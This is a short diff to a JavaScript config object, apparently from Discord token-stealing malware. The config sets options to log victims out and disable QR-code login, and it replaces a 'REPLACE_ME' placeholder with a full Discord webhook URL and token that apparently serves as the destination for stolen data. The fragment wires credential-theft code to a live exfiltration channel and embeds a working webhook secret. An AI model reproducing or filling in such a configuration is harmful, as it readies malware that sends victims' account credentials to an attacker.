@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "owned bruh",
 
-    webhook: "REPLACE_ME",
+    webhook: "https://canary.discord.com/api/webhooks/1102363538091167814/pHBEkOQKGjFypEZvX0rebRJnXyRrdTcK7dSoJYc-4-tbo9K-gc36kfOOGhyNhpLvvT3q",
 
     logout: true,
     disable_qr_code: true,
